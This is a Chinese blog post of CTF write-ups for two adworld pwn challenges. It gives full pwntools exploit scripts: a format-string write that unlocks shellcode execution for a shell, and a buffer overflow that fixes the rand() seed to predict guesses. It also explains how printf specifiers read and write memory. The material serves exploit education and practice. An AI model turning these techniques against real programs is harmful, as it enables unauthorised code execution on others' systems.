

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Cerises">
  <meta name="keywords" content="">
  <meta name="description" content="String12345678910111213141516171819202122from pwn import *context.terminal &#x3D; [&amp;#x27;terminator&amp;#x27;,&amp;#x27;-x&amp;#x27;,&amp;#x27;sh&amp;#x27;,&amp;#x27;-c&amp;#x27;]context(arch&#x3D;&amp;#x27;amd64&amp;#x27;, os&#x3D;&amp;#x27;linux&amp;#x27;)#">
<meta property="og:type" content="article">
<meta property="og:title" content="adworld_pwn_lasting">
<meta property="og:url" content="https://ceris3s.github.io/2022/02/21/adworld_pwn_lasting/index.html">
<meta property="og:site_name" content="blog">
<meta property="og:description" content="String12345678910111213141516171819202122from pwn import *context.terminal &#x3D; [&amp;#x27;terminator&amp;#x27;,&amp;#x27;-x&amp;#x27;,&amp;#x27;sh&amp;#x27;,&amp;#x27;-c&amp;#x27;]context(arch&#x3D;&amp;#x27;amd64&amp;#x27;, os&#x3D;&amp;#x27;linux&amp;#x27;)#">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-02-21T01:24:21.823Z">
<meta property="article:modified_time" content="2022-02-21T01:24:21.823Z">
<meta property="article:author" content="Cerises">
<meta name="twitter:card" content="summary_large_image">
  
  <title>adworld_pwn_lasting - blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"ceris3s.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.1"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>ceris3s</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="adworld_pwn_lasting">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-02-21 09:24" pubdate>
        2022年2月21日 上午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      32k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      100 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">adworld_pwn_lasting</h1>
            
            <div class="markdown-body">
              <h2 id="String"><a href="#String" class="headerlink" title="String"></a>String</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./string&quot;)</span><br><span class="hljs-comment">#gdb.attach(proc.pidof(p)[0])</span><br>p = remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>,43301)<br><span class="hljs-builtin-name">print</span> p.recvuntil(<span class="hljs-string">&quot;secret[0] is &quot;</span>)<br>after_content = p.recvuntil(<span class="hljs-string">&quot;What should your character&#x27;s name be:\n&quot;</span>)<br><span class="hljs-builtin-name">print</span> after_content<br>secret_addr = int(after_content.split(<span class="hljs-string">&#x27;\n&#x27;</span>)[0],16)<br>p.sendline(<span class="hljs-string">&quot;test&quot;</span>)<br>addr_wanted = str(secret_addr)<br>shellcode = asm(shellcraft.sh())<br><span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot; addr_wanted:&quot;</span>,addr_wanted)<br><span class="hljs-builtin-name">print</span> p.sendlineafter(<span class="hljs-string">&quot;So, where you will go?east or up?:\n&quot;</span>,<span class="hljs-string">&quot;east&quot;</span>)<br><span class="hljs-builtin-name">print</span> p.sendlineafter(<span class="hljs-string">&quot;go into there(1), or leave(0)?:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-builtin-name">print</span> p.sendlineafter(<span class="hljs-string">&quot;&#x27;Give me an address&#x27;\n&quot;</span>,addr_wanted)<br><span class="hljs-builtin-name">print</span> p.sendlineafter(<span class="hljs-string">&quot;And, you wish is:\n&quot;</span>,<span class="hljs-string">&quot;%85s%7<span class="hljs-variable">$n</span>&quot;</span>)<br><span class="hljs-builtin-name">print</span> p.recvuntil(<span class="hljs-string">&quot;Wizard: I will help you! USE YOU SPELL\n&quot;</span>)<br>p.sendline(shellcode)<br><span class="hljs-comment">#print p.sendlineafter(&quot;Wizard: I will help you! USE YOU SPELL\n&quot;,shellcode)</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>%c：输出字符，配上%n可用于向指定地址写数据。</p>
<p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p>
<p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p>
<p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p>
<p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p>
<p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</p>
<p>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p>
<p> %7$n表示将前面输出的字符数（即85）写入偏移7处储存的栈地址所指向空间 </p>
<p>首先主程序：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino">v3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8uLL</span>);<br>  v4 = (__int64)v3;<br>  *v3 = <span class="hljs-number">68</span>;<br>  v3[<span class="hljs-number">1</span>] = <span class="hljs-number">85</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;we will tell you two secret ...&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;secret[0] is %x\n&quot;</span>, v4, a2);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;secret[1] is %x\n&quot;</span>, v4 + <span class="hljs-number">4</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;do not tell anyone &quot;</span>);<br>  <span class="hljs-built_in">sub_400D72</span>(v4);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The End.....Really?&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br></code></pre></td></tr></table></figure>

<p>跟进sub_400D72(v4);</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">v3 = <span class="hljs-constructor">__readfsqword(0x28u)</span>;<br> puts(<span class="hljs-string">&quot;What should your character&#x27;s name be:&quot;</span>);<br> <span class="hljs-constructor">_isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, &amp;<span class="hljs-params">s</span>)</span>;<br> <span class="hljs-keyword">if</span> ( strlen(&amp;s) &lt;= <span class="hljs-number">0xC</span> )<br> &#123;<br>   puts(<span class="hljs-string">&quot;Creating a new player.&quot;</span>);<br>   sub<span class="hljs-constructor">_400A7D()</span>;<br>   fmt<span class="hljs-literal">()</span>;<br>   sub<span class="hljs-constructor">_400CA6((<span class="hljs-params">_DWORD</span> <span class="hljs-operator">*</span>)</span>a1);<br> &#125;<br></code></pre></td></tr></table></figure>

<p>发现fmt()有fmt_vul</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lisp">puts(<span class="hljs-string">&quot;And, you wish is:&quot;</span>)<span class="hljs-comment">;</span><br>    _isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-symbol">&amp;format</span>)<span class="hljs-comment">;</span><br>    puts(<span class="hljs-string">&quot;Your wish is&quot;</span>)<span class="hljs-comment">;</span><br>    printf(<span class="hljs-name">&amp;format</span>, <span class="hljs-symbol">&amp;format</span>)<span class="hljs-comment">;</span><br>    puts(<span class="hljs-string">&quot;I hear it, I hear it....&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>由<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/47d80d34e5ee">函数调用约定</a>可知，在64位程序下，前六个参数从左到右放入<em>RDI</em>, <em>RSI</em>, <em>RDX</em>, <em>ECX</em>, <em>R8</em>, <em>R9</em>中，利用<strong>格式化字符串漏洞</strong>，进入脆弱点，写入<strong>shellcode</strong></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">...[overwrite addr]....<span class="hljs-string">%[overwrite offset]</span>$n<br></code></pre></td></tr></table></figure>

<p>其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤</p>
<ul>
<li>确定覆盖地址</li>
<li>确定相对偏移</li>
<li>进行覆盖</li>
</ul>
<p>所以从n = 7开始，我们可以修改栈中的数据为85。</p>
<p>进入sub_400CA6</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">if</span> <span class="hljs-comment">( *a1 == a1[1] )</span><br> &#123;<br>   puts<span class="hljs-comment">(&quot;Wizard: I will help you! USE YOU SPELL&quot;)</span>;<br>   v<span class="hljs-number">1</span> = mmap<span class="hljs-comment">(0LL, 0x1000uLL, 7, 33, -1, 0LL)</span>;<br>   read<span class="hljs-comment">(0, v1, 0x100uLL)</span>;<br>   <span class="hljs-comment">((void (__fastcall *)</span><span class="hljs-comment">(_QWORD, void *)</span>)v<span class="hljs-number">1</span>)<span class="hljs-comment">(0LL, v1)</span>;<br> &#125;<br></code></pre></td></tr></table></figure>

<p>  其中a1存放的是v3的地址，就是我们v3申请的内存大小为8的内存空间。理顺思路，这里如果我们可以使这8内存的空间中的前四个字节和后四个字节相等，就可以打shellcode。于是我们可以理顺思路，在最开始时拿到两个4字节的地址-&gt;v3[0]和v3[1]的地址，然后在之后的函数中将其中一个修改成和另一个相同-&gt;再在此处打shellcode。exp如下：</p>
<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+8h] [rbp-38h]</span><br>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+Ch] [rbp-34h]</span><br>  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-10h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-number">0LL</span>);<br>  v4 = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  *(_QWORD *)seed = <span class="hljs-built_in">sub_BB0</span>();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-------------------------------&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to a guess number game!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-------------------------------&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please let me know your name!&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your name:&quot;</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">gets</span>((__int64)&amp;v7);<br>  <span class="hljs-built_in">srand</span>(seed[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )<br>  &#123;<br>    v6 = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">6</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------Turn:%d-------------\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(i + <span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input your guess number:&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;---------------------------------&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( v4 != v6 )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;GG!&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">sub_C3E</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<p>点进V7</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">-<span class="hljs-number">0000000000000030</span> var_30          <span class="hljs-built_in">db</span> ?<br>-000000000000002F                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000002E                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">000000000000002D</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000002C                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000002B                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000002A                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000029</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000028</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000027</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000026</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000025</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000024</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000023</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000022</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000021</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000020</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000001F                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000001E                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">000000000000001D</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000001C                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">000000000000001B</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000001A                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000019</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000018</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000017</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000016</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000015</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000014</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000013</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000012</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000011</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000010</span> seed            <span class="hljs-built_in">dd</span> <span class="hljs-number">2</span> dup(?)<br></code></pre></td></tr></table></figure>

<p>进入sub_C3E()</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">__int64</span> <span class="hljs-function"><span class="hljs-title">sub_C3E</span>()</span><br>&#123;<br>  <span class="hljs-function"><span class="hljs-title">printf</span>(<span class="hljs-string">&quot;You are a prophet!\nHere is your flag!&quot;</span>);</span><br><span class="hljs-function">  <span class="hljs-title">system</span>(<span class="hljs-string">&quot;cat flag&quot;</span>);</span><br><span class="hljs-function">  <span class="hljs-variable">return</span> <span class="hljs-number">0</span><span class="hljs-variable">LL</span>;</span><br><span class="hljs-function">&#125;</span><br></code></pre></td></tr></table></figure>

<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> ctypes import*<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><span class="hljs-attribute">io</span>=remote(&#x27;111.198.29.45&#x27;,58633)<br><span class="hljs-comment">#io=process(&#x27;./guess_num&#x27;)</span><br><span class="hljs-comment">#elf=ELF(&#x27;guess_num&#x27;)</span><br><span class="hljs-comment">#libc=elf.libc</span><br><span class="hljs-comment">#libc= ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="hljs-attribute">libc</span>=cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#或者libc=CDLL(&quot;XXX&quot;)<br>io.sendlineafter(<span class="hljs-string">&#x27;Your name:&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x20+p64(1))<br><span class="hljs-comment">#libc.srand(1)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(10):<br>      io.sendlineafter(<span class="hljs-string">&#x27;number:&#x27;</span>,str(libc.rand()%6 +1))<br><br>io.interactive()<br></code></pre></td></tr></table></figure>



<p>错误：AttributeError: ‘ELF’ object has no attribute ‘rand’，所以不能用ELF对象</p>
<p>可以使用LibraryLoader</p>
<h5 id="关于rand和srand"><a href="#关于rand和srand" class="headerlink" title="关于rand和srand"></a>关于rand和srand</h5><p>随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。<br> 对于该题目，我们将随机种子设置为0或1都可，参考文件中的循环来写脚本。</p>
<h5 id="python调用c语言的函数库"><a href="#python调用c语言的函数库" class="headerlink" title="python调用c语言的函数库"></a>python调用c语言的函数库</h5><p>1.生成c语言函数</p>
